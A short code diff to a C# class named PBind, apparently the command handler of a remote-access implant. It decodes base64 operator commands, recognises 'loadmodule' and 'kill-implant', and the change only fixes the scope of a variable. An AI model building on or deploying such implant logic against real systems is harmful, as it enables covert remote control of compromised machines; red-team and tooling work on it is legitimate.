@@ -58,13 +58,14 @@ public class PBind
         }
         else if (pbindConnected)
         {
+            string command = null;
             if (args[0].StartsWith("loadmodule"))
             {
                 byte[] data = Convert.FromBase64String(args[0].Replace("loadmodule", ""));
-                string command = Encoding.UTF8.GetString(data);
+                command = Encoding.UTF8.GetString(data);
             } else {
                 byte[] data = Convert.FromBase64String(args[0]);
-                string command = Encoding.UTF8.GetString(data);
+                command = Encoding.UTF8.GetString(data);
             }
             if (command.ToLower().Trim() == "kill-implant")
             {
